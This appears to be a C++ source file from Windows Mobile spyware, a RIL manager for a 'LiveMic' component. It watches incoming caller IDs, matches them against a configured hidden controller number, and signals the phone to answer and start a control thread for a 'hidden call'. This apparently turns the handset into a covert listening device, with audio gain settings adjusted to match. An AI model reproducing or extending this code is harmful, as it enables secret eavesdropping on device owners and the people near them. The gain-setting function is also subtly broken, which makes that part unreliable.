#include <new>
#include <string>
using namespace std;

#include <Windows.h>
#include <ril.h>
#include "RilManager.h"

void RilManager::HandleResult(DWORD dwCode, HRESULT hrCmdID, const void *lpData, DWORD cbdata)
{
	/*if (hrCmdID == m_hrSetAudio) {
		DBG_TRACE(L"RilManager HandleResult SetAudioGain ", 5, FALSE);
	}

	if (hrCmdID == m_hrGetAudio) {
		DBG_TRACE(L"RilManager HandleResult GetAudioGain ", 5, FALSE);

		if (cbdata) {
			ZeroMemory(&m_rilGetInfo, sizeof(RILGAININFO));
			CopyMemory(&m_rilGetInfo, lpData, cbdata);
		}

		if (cbdata == sizeof(RILGAININFO)) {	
			memcpy_s(&m_rilGetInfo, sizeof(RILGAININFO), lpData, cbdata); 
			DBG_TRACE_INT(L"RilManager GetAudioGain dwRxGain: ", 5, FALSE, m_rilGetInfo.dwRxGain);
			DBG_TRACE_INT(L"RilManager GetAudioGain dwTxGain: ", 5, FALSE, m_rilGetInfo.dwTxGain);
		}
	}*/
}

void RilManager::HandleNotify(DWORD dwCode, const void *lpData, DWORD cbdata)
{
	if (RIL_NOTIFY_CALLERID == dwCode) { 
		LiveMic* pLiveMic = pLiveMic->self();

		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);

		if (!pLiveMic->IsHiddenCallInProgress()) {
			if (HandleCallerIdEvent((RILREMOTEPARTYINFO*)lpData, cbdata)) {		
				pLiveMic->StartCtrlTh();
			}
		}	
		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
		return;
	}

	/*if (RIL_NOTIFY_RING == dwCode) {
		HandleCallRing((RILRINGINFO*)lpData, cbdata);
		return;
	}*/
}

BOOL RilManager::GetAudioGain()
{
	if (m_hrGetAudio)
		return FALSE;

	m_hrGetAudio = RIL_GetAudioGain(m_hRil);
	if (m_hrGetAudio < 0) {
		DBG_TRACE_INT(L"RilManager GetAudioGain FAILED", 5, FALSE, m_hrGetAudio);
		return FALSE;
	}
	
	DBG_TRACE_INT(L"RilManager GetAudioGain OK ", 5, FALSE, m_hrSetAudio);

	return TRUE;
}

BOOL RilManager::SetAudioGain( BOOL bRestore )
{
	if (m_hrSetAudio)
		return FALSE;

	if (!bRestore) {
		RILGAININFO rilGainInfo;
		ZeroMemory(&rilGainInfo, sizeof(RILGAININFO));
		rilGainInfo.cbSize = sizeof(RILGAININFO);
		rilGainInfo.dwTxGain = 0xFFFFFFFF;
		rilGainInfo.dwRxGain = 0x1;
		rilGainInfo.dwParams = 3;
		
	}else
		m_hrSetAudio = RIL_SetAudioGain(m_hRil, &m_rilGetInfo);

	if (m_hrSetAudio < 0) {
		DBG_TRACE_INT(L"RilManager SetAudioGain FAILED", 5, FALSE, m_hrSetAudio);
		return FALSE;
	}

	DBG_TRACE_INT(L"RilManager SetAudioGain OK ", 5, FALSE, m_hrSetAudio);

	return TRUE;
}

BOOL RilManager::HandleCallRing(RILRINGINFO* ri, DWORD cbdata)
{
	return TRUE;
}

std::wstring RilManager::GetRilRemoteCallerNumber(RILREMOTEPARTYINFO* pi)
{
	std::wstring num = L"";

	DBG_TRACE(L"------------------------------------\nRilManager GetRilRemoteCallerNumber ", 5, FALSE);
	if (pi->wszDescription) {
		DBG_TRACE(L"Description:", 5, FALSE);
		DBG_TRACE(pi->wszDescription, 5, FALSE);
		DBG_TRACE(L"---------", 5, FALSE);
	}

	DBG_TRACE(L"RilManager GetRilRemoteCallerNumber pi->raAddress: ", 5, FALSE);
	DBG_TRACE_INT(L"\tpi->raAddress.dwNumPlan: ", 5, FALSE, pi->raAddress.dwNumPlan);
	DBG_TRACE_INT(L"\tpi->raAddress.dwParams: ", 5, FALSE, pi->raAddress.dwParams);
	DBG_TRACE_INT(L"\tpi->raAddress.dwType: ", 5, FALSE, pi->raAddress.dwType);
	DBG_TRACE(L"\tpi->raAddress.wszAddress:", 5, FALSE);
	DBG_TRACE(pi->raAddress.wszAddress, 5, FALSE);
	DBG_TRACE(L"---------", 5, FALSE);								 
		DBG_TRACE_INT(L"pi->rsaSubAddress.dwParams: ", 5, FALSE, pi->rsaSubAddress.dwParams);
		DBG_TRACE_INT(L"pi->rsaSubAddress.dwType: ", 5, FALSE,pi->rsaSubAddress.dwType);
		DBG_TRACE(L"pi->rsaSubAddress.wszSubAddress: ", 5, FALSE);
		DBG_TRACE(pi->rsaSubAddress.wszSubAddress, 5, FALSE);
			
	if (pi->dwParams&RIL_PARAM_RPI_ADDRESS) {
		if (pi->dwParams&RIL_PARAM_RPI_VALIDITY)
			num.assign(pi->raAddress.wszAddress);
		
		if (pi->dwParams&RIL_PARAM_RPI_DESCRIPTION) {
			num.assign(L"+");
			num.append(pi->raAddress.wszAddress);
		}
	}

	return num;
}

BOOL RilManager::HandleCallerIdEvent(RILREMOTEPARTYINFO* pi, DWORD cbdata)
{
	LiveMic* pLiveMic = pLiveMic->self();
	if (pLiveMic == NULL)
		return FALSE;
	
	if (pi->cbSize != cbdata)
		return FALSE;

	wstring numBase(pLiveMic->GetHiddenTelNumber());
	wstring numCaller(GetRilRemoteCallerNumber(pi));
	
	if (numBase.length() == 0 || numCaller.length() == 0) {
		DBG_TRACE(L"RilManager numBase.length() == 0 || numCaller.length() == 0", 5, FALSE);
		return FALSE;
	}
	
	DBG_TRACE(L"RilManager HandleCallerIdEvent numbase: ", 5, FALSE);
	DBG_TRACE((PWCHAR)numBase.c_str(), 5, FALSE);
	DBG_TRACE(L"RilManager HandleCallerIdEvent numCaller: ", 5, FALSE);
	DBG_TRACE((PWCHAR)numCaller.c_str(), 5, FALSE);

	if (numBase.compare(numCaller) == 0) {
		SetEvent(pLiveMic->GetAnswerEventHandler());
		DBG_TRACE(L"RilManager HandleCallerIdEvent TRUE 1 ", 5, FALSE);
		return TRUE;
	}
	
	wstring::size_type foundPos;
	wstring needle;
	wstring haystack;

	if (numBase.length() > numCaller.length()) {
		haystack = numBase;
		needle = numCaller;
	} else {
		haystack = numCaller;
		needle = numBase;
	}
	
	foundPos = haystack.find(needle, 0);
	DBG_TRACE_INT(L"RilManager HandleCallerIdEvent Find: ", 5, FALSE, foundPos);

	if (foundPos != wstring::npos) {
		SetEvent(pLiveMic->GetAnswerEventHandler());
		DBG_TRACE(L"RilManager HandleCallerIdEvent TRUE 2 ", 5, FALSE);
		return TRUE;
	} 

	DBG_TRACE(L"RilManager HandleCallerIdEvent FALSE ", 5, FALSE);
	return FALSE;	
}
	
BOOL RilManager::Init()
{
	HRESULT hr;
	
	hr = RIL_Initialize(m_dwIndex,
						&ResultProc,
						&NotifyProc,
						RIL_NCLASS_ALL,
						(DWORD) this,
						&m_hRil);
	if (SUCCEEDED(hr)) {		
		return TRUE;
	}

	DBG_TRACE(L"RilManager Init FAILED ", 5, FALSE);

	return FALSE;
}

BOOL RilManager::UnInit()
{
	HRESULT hr = E_FAIL;

	if (m_hRil) {

		hr = RIL_Deinitialize(m_hRil);

		if (hr != S_OK)
			return FALSE;

		m_hRil = NULL;
	}

	return TRUE;
}

RilManager::RilManager(void)
{
	m_hRil = NULL;
	m_dwIndex = 1;

	m_hrGetAudio = 0;
	m_hrSetAudio = 0;
}

RilManager::~RilManager(void)
{
	UnInit();
}